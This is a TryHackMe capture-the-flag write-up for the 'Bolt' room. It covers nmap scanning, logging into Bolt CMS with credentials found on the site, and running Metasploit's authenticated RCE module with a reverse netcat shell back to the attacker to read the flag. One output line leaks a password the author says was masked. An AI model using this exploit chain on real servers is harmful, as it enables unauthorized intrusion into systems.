---
title: "Bolt_writeup.sh"
date: 2020-08-26T21:34:28-04:00
draft: false
toc: true
cover: "img/bolt_cover.gif"
tags:
  - hacking
  - tryHackme
  - writeups
---

# Bolt - THM Room


This is a quick writeup or another "just-me-taking-notes" thingy for Bolt TryhackMe's room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. You have been warned :)

Enjoy!

- Please visit This room on TryHackMe by [clicking this link](https://tryhackme.com/room/bolt).
- **PLEASE NOTE:** Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.


[Task 1] What port number has a web server with a CMS running?
--------------------------------------------------------------

Let's fire up an **nmap** scan:

```sh
┌──(kali㉿kali)-[~/Documents/THM/bolt]
└─$ nmap -A -sC -sV -T4 10.10.105.96

```

While nmap runs let's take a look at the IP on the browser to see if there is any page being served. We get the default apache page:

![Apache2 Ubuntu default page](https://i.imgur.com/zVMGPMS.png)

and if we try to navigate to any other URL we can get the specific version:

![Apache2 version](https://i.imgur.com/o5N22Ss.png)


Let's check nmap results:

```sh
┌──(kali㉿kali)-[~/Documents/THM/bolt]
└─$ nmap -A -sC -sV -T4 10.10.105.96
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-26 20:22 EDT
Nmap scan report for 10.10.105.96
Host is up (0.38s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA)
|   256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA)
|_  256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8***/tcp open  http    (PHP 7.2.32-1)
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Date: Thu, 27 Aug 2020 00:23:45 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: private, must-revalidate
|     Date: Thu, 27 Aug 2020 00:23:45 GMT
|     Content-Type: text/html; charset=UTF-8
|     pragma: no-cache
|     expires: -1
|     X-Debug-Token: 0531cf
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     </head>
|     <body>
|     href="#main-content" class="vis
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Thu, 27 Aug 2020 00:23:44 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: public, s-maxage=600
|     Date: Thu, 27 Aug 2020 00:23:44 GMT
|     Content-Type: text/html; charset=UTF-8
|     X-Debug-Token: e716a7
|     <!doctype html>
|     <html lang="en-GB">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     <link rel="canonical" href="http://0.0.0.0:8000/">
|     </head>
|_    <body class="front">
|_http-generator: Bolt
|_http-title: Bolt | A hero is unleashed
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.80%I=7%D=8/26%Time=5F46FCF0%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1EFB,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Thu,\x2027\x20Aug\x20
SF:2020\x2000:23:44\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP
SF:/7\.2\.32-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20pu
SF:blic,\x20s-maxage=600\r\nDate:\x20Thu,\x2027\x20Aug\x202020\x2000:23:44
SF:\x20GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nX-Debug-Toke
SF:n:\x20e716a7\r\n\r\n<!doctype\x20html>\n<html\x20lang=\"en-GB\">\n\x20\
SF:x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"u
SF:tf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20
SF:content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Bolt\x20\|\x20A
SF:\x20hero\x20is\x20unleashed</title>\n\x20\x20\x20\x20\x20\x20\x20\x20<l
SF:ink\x20href=\"https://fonts\.googleapis\.com/css\?family=Bitter\|Roboto
SF::400,400i,700\"\x20rel=\"stylesheet\">\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/css/bulma\.css\
SF:?8ca0842ebb\">\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"styleshe
SF:et\"\x20href=\"/theme/base-2018/css/theme\.css\?6cb66bfe9f\">\n\x20\x20
SF:\x20\x20\t<meta\x20name=\"generator\"\x20content=\"Bolt\">\n\x20\x20\x2
SF:0\x20\t<link\x20rel=\"canonical\"\x20href=\"http://0\.0\.0\.0:8000/\">\
SF:n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body\x20class=\"front\">\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<a\x20")%r(FourOhFourRequest,152B,"HTTP/1
SF:\.0\x20404\x20Not\x20Found\r\nDate:\x20Thu,\x2027\x20Aug\x202020\x2000:
SF:23:45\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP/7\.2\.32-1
SF:\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20private,\x20m
SF:ust-revalidate\r\nDate:\x20Thu,\x2027\x20Aug\x202020\x2000:23:45\x20GMT
SF:\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\npragma:\x20no-cache
SF:\r\nexpires:\x20-1\r\nX-Debug-Token:\x200531cf\r\n\r\n<!doctype\x20html
SF:>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial
SF:-scale=1\.0\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20<title>Bolt\x20\|\x20A\x20hero\x20is\x20unleashed</title>\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<link\x20href=\"https://fonts\.googleapis\
SF:.com/css\?family=Bitter\|Roboto:400,400i,700\"\x20rel=\"stylesheet\">\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/
SF:theme/base-2018/css/bulma\.css\?8ca0842ebb\">\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/css/them
SF:e\.css\?6cb66bfe9f\">\n\x20\x20\x20\x20\t<meta\x20name=\"generator\"\x2
SF:0content=\"Bolt\">\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"#main-content\"\x20class=\"v
SF:is");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.93 seconds
```

[Task 2] What is the username we can find in the CMS?
-----------------------------------------------------

Without much digging I'm gonna guess it is **bolt** based on the overall theme of the room and indeed it is accepted as valid. This is weird because the post we can see in the page mentions the user is **jake** and he also posts his password **REDACTED** could this be a bug on the room? (Spoiler: It is not. XD )



[Task 3] What is the password we can find for the username?
-----------------------------------------------------------

![Post from Admin with a Password](https://i.imgur.com/Swa5OGj.png)

We already got a password in the previous task.



[Task 4] What version of the CMS is installed on the server? (Ex: Name 1.1.1)
-----------------------------------------------------------------------------

Since we have a username and password, we could try to google a bit common login page URL locations for Bolt CMS.
When we try to access, we do get a login form.

![Bolt Login form](https://i.imgur.com/3Q8d31i.png)


Once we are logged in we can see the installed version in the footer toolbar and with that we get the answer to the CMS version:

![Bolt version installed](https://i.imgur.com/3Wv2bhG.png)

Let's move to the next question.


[Task 5] There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What's its EDB-ID?
-------------------------------------------------------------------------------

Using **Exploit-DB** we can look for RCE vulnerabilities for **older** versions of Bolt CMS.

![Exploit-DB](https://i.imgur.com/DXLDHC9.png)

Let's move on.


[Task 6] Metasploit recently added an exploit module for this vulnerability. What's the full path for this exploit? (Ex: exploit/....)
--------------------------------------------------------------------------------

We fire up **msfconsole** and do a **search bolt cms** to see the available exploits:

```sh
msf5 > search bolt cms

Matching Modules
================

   #   Name                                              Disclosure Date  Rank       Check  Description
   -   ----                                              ---------------  ----       -----  -----------
   0   auxiliary/admin/sunrpc/solaris_kcms_readfile      2003-01-22       normal     No     Solaris KCMS + TTDB Arbitrary File Read
   1   auxiliary/gather/ipcamera_password_disclosure     2016-08-16       normal     No     JVC/Siemens/Vanderbilt IP-Camera Readfile Password Disclosure
   2   auxiliary/gather/nuuo_cms_bruteforce              2018-10-11       normal     No     Nuuo Central Management Server User Session Token Bruteforce
   3   auxiliary/gather/nuuo_cms_file_download           2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
   4   auxiliary/scanner/http/ektron_cms400net                            normal     No     Ektron CMS400.NET Default Password Scanner
   5   auxiliary/scanner/http/s40_traversal              2011-04-07       normal     No     S40 0.4.2 CMS Directory Traversal Vulnerability
   6   auxiliary/scanner/http/squiz_matrix_user_enum     2011-11-08       normal     No     Squiz Matrix User Enumeration Scanner
   7   auxiliary/scanner/http/vcms_login                                  normal     No     V-CMS Login Utility
   8   auxiliary/scanner/misc/cctv_dvr_login                              normal     No     CCTV DVR Login Scanning Utility
   9   exploit/aix/rpc_cmsd_opcode21                     2009-10-07       great      No     AIX Calendar Manager Service Daemon (rpc.cmsd) Opcode 21 Buffer Overflow
   10  exploit/linux/http/cayin_cms_ntp                  2020-06-04       excellent  Yes    Cayin CMS NTP Server RCE
   11  exploit/linux/http/tiki_calendar_exec             2016-06-06       excellent  Yes    Tiki-Wiki CMS Calendar Command Execution
   12  exploit/linux/http/vcms_upload                    2011-11-27       excellent  Yes    V-CMS PHP File Upload and Execute
   13  exploit/multi/http/bolt_file_upload               2015-08-17       excellent  Yes    CMS Bolt File Upload Vulnerability
   14  exploit/multi/http/cmsms_object_injection_rce     2019-03-26       normal     Yes    CMS Made Simple Authenticated RCE via object injection
   15  exploit/multi/http/cmsms_showtime2_rce            2019-03-11       normal     Yes    CMS Made Simple (CMSMS) Showtime2 File Upload RCE
   16  exploit/multi/http/cmsms_upload_rename_rce        2018-07-03       excellent  Yes    CMS Made Simple Authenticated RCE via File Upload/Copy
   17  exploit/multi/http/familycms_less_exec            2011-11-29       excellent  Yes    Family Connections less.php Remote Command Execution
   18  exploit/multi/http/getsimplecms_unauth_code_exec  2019-04-28       excellent  Yes    GetSimpleCMS Unauthenticated RCE
   19  exploit/multi/http/lcms_php_exec                  2011-03-03       excellent  Yes    LotusCMS 3.0 eval() Remote Command Execution
   20  exploit/multi/http/log1cms_ajax_create_folder     2011-04-11       excellent  Yes    Log1 CMS writeInfo() PHP Code Injection
   21  exploit/multi/http/monstra_fileupload_exec        2017-12-18       excellent  Yes    Monstra CMS Authenticated Arbitrary File Upload
   22  exploit/multi/http/navigate_cms_rce               2018-09-26       excellent  Yes    Navigate CMS Unauthenticated Remote Code Execution
   23  exploit/multi/http/october_upload_bypass_exec     2017-04-25       excellent  Yes    October CMS Upload Protection Bypass Code Execution
   24  exploit/multi/http/polarcms_upload_exec           2012-01-21       excellent  Yes    PolarBear CMS PHP File Upload Vulnerability
   25  exploit/multi/http/sflog_upload_exec              2012-07-06       excellent  Yes    Sflog! CMS 1.0 Arbitrary File Upload Vulnerability
   26  exploit/multi/http/totaljs_cms_widget_exec        2019-08-30       excellent  Yes    Total.js CMS 12 Widget JavaScript Code Injection
   27  exploit/multi/php/php_unserialize_zval_cookie     2007-03-04       average    Yes    PHP 4 unserialize() ZVAL Reference Counter Overflow (Cookie)
   28  exploit/unix/webapp/bolt_authenticated_rce        2020-05-07       excellent  Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution
   29  exploit/unix/webapp/get_simple_cms_upload_exec    2014-01-04       excellent  Yes    GetSimpleCMS PHP File Upload Vulnerability
   30  exploit/unix/webapp/havalite_upload_exec          2013-06-17       excellent  Yes    Havalite CMS Arbitary File Upload Vulnerability
   31  exploit/unix/webapp/instantcms_exec               2013-06-26       excellent  Yes    InstantCMS 1.6 Remote PHP Code Execution
   32  exploit/unix/webapp/joomla_akeeba_unserialize     2014-09-29       excellent  Yes    Joomla Akeeba Kickstart Unserialize Remote Code Execution
   33  exploit/unix/webapp/joomla_media_upload_exec      2013-08-01       excellent  Yes    Joomla Media Manager File Upload Vulnerability
   34  exploit/unix/webapp/libretto_upload_exec          2013-06-14       excellent  Yes    LibrettoCMS File Manager Arbitary File Upload Vulnerability
   35  exploit/unix/webapp/skybluecanvas_exec            2014-01-28       excellent  Yes    SkyBlueCanvas CMS Remote Code Execution
   36  exploit/windows/browser/ie_execcommand_uaf        2012-09-14       good       No     MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability
   37  exploit/windows/http/ektron_xslt_exec             2012-10-16       excellent  Yes    Ektron 8.02 XSLT Transform Remote Code Execution
   38  exploit/windows/http/ektron_xslt_exec_ws          2015-02-05       excellent  Yes    Ektron 8.5, 8.7, 9.0 XSLT Transform Remote Code Execution
   39  exploit/windows/http/kentico_staging_syncserver   2019-04-15       excellent  Yes    Kentico CMS Staging SyncServer Unserialize Remote Command Execution
   40  exploit/windows/http/umbraco_upload_aspx          2012-06-28       excellent  No     Umbraco CMS Remote Command Execution
   41  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)
   42  exploit/windows/nuuo/nuuo_cms_fu                  2018-10-11       manual     No     Nuuo Central Management Server Authenticated Arbitrary File Upload
   43  exploit/windows/nuuo/nuuo_cms_sqli                2018-10-11       normal     No     Nuuo Central Management Authenticated SQL Server SQLi
   44  exploit/windows/smtp/njstar_smtp_bof              2011-10-31       normal     Yes    NJStar Communicator 3.00 MiniSMTP Buffer Overflow


Interact with a module by name or index, for example use 44 or use exploit/windows/smtp/njstar_smtp_bof

msf5 > 
```

by looking at the results returned and having found the vulnerability on **Exploit-DB** we get the answer to the room question.
Let's try to exploit that in the next step.



[Task 7] Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit
-------------------------------------------------------------------------------------------------

Let's configure the options for our exploit, by doing **show options**

```sh
[*] Using configured payload cmd/unix/reverse_netcat
msf5 exploit(unix/webapp/bolt_authenticated_rce) > show options

Module options (exploit/unix/webapp/bolt_authenticated_rce):

   Name                 Current Setting        Required  Description
   ----                 ---------------        --------  -----------
   FILE_TRAVERSAL_PATH  ../../../public/files  yes       Traversal path from "/files" on the web server to "/root" on the server
   PASSWORD                                    yes       Password to authenticate with
   Proxies                                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                8***                   yes       The target port (TCP)
   SRVHOST              0.0.0.0                yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT              8080                   yes       The local port to listen on.
   SSL                  false                  no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI            /                      yes       Base path to Bolt CMS
   URIPATH                                     no        The URI to use for this exploit (default is random)
   USERNAME                                    yes       Username to authenticate with
   VHOST                                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   Linux (cmd)
msf5 exploit(unix/webapp/bolt_authenticated_rce) > set LHOST tun0
LHOST => 10.13.0.34
msf5 exploit(unix/webapp/bolt_authenticated_rce) > set RHOSTS 10.10.105.96
RHOSTS => 10.10.105.96
msf5 exploit(unix/webapp/bolt_authenticated_rce) > set USERNAME bolt
USERNAME => bolt
msf5 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD REDACTED
PASSWORD => boltadmin123
msf5 exploit(unix/webapp/bolt_authenticated_rce) > 

```

Let's run the exploit so we can answer the last question:

[Task 8] Look for flag.txt inside the machine.
----------------------------------------------

```sh
msf5 exploit(unix/webapp/bolt_authenticated_rce) > run

[*] Started reverse TCP handler on 10.13.0.34:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "hxzhm".
[*] Found 4 potential token(s) for creating .php files.
[+] Deleted file evhhumxnxs.php.
[+] Deleted file jfdcqabl.php.
[+] Deleted file hgpputegi.php.
[+] Used token dc684ac30691d198a52d1110d6 to create helqvqylpa.php.
[*] Attempting to execute the payload via "/files/helqvqylpa.php?hxzhm=`payload`"
[*] Command shell session 7 opened (10.13.0.34:4444 -> 10.10.105.96:44727) at 2020-08-26 21:26:37 -0400
[!] No response, may have executed a blocking payload!
[+] Deleted file helqvqylpa.php.
[+] Reverted user profile back to original state.

ls
index.html
shell  
[*] Trying to find binary(python) on target machine
[*] Found python at 
[*] Using `python` to pop up an interactive shell
pwd
/home/bolt/public/files
cat /home/bolt/flag.txt
cat /home/flag.txt
THM{FLAG_REDACTED_YOU_GOT_THIS!}

```

The shell we got is quite basic and in my case we it hanged a lot of times. I was unable to upgrade that shell to meterpreter, but to be honest I tried it just once and moved on. I tried a bit of exploring probing some paths with **cat** looking for **flag.txt** and found it rather quickly.


That's it for Bolt room. Hope you enjoyed it!

As usual, happy hacking.

{{< thm_badge >}}
